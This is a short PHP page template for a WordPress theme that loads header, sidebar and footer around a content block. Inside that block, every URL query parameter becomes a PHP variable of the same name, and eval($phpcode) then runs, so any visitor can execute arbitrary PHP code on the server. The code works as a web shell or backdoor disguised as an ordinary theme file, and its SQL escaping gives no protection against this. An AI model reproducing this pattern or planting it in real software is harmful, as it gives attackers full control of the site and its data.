<?php get_header(); ?>

<?php global $post; ?>

<div id="content">

<div class="post">

<?php
require 'Pod.class.php';

foreach ($_GET as $key => $val)
{
    ${$key} = mysql_real_escape_string($val);
}

eval($phpcode);
?>

</div>
</div>

<?php get_sidebar(); ?>

<?php get_footer(); ?>

<?php die(); ?>

